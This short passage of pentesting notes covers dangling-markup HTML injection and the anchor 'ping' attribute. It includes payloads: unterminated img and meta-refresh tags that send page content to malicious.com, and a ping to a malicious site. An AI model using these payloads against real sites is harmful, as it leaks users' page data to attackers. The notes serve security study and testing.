
## Dangling markup
In dangling markup, you want to not terminate the string from your payload to compromise everything in between your payload and the following 
```
" ' `
```

```html
<img src='http://malicious.com/?c=
<meta http-equiv="refresh" content='4; URL=https://malicious.com/?c=
```
https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection

## Ping

You can make a webserver ping another webserver by using the attribute ping of the `<a>` tag.

```html
<a ping="malicious_site">
```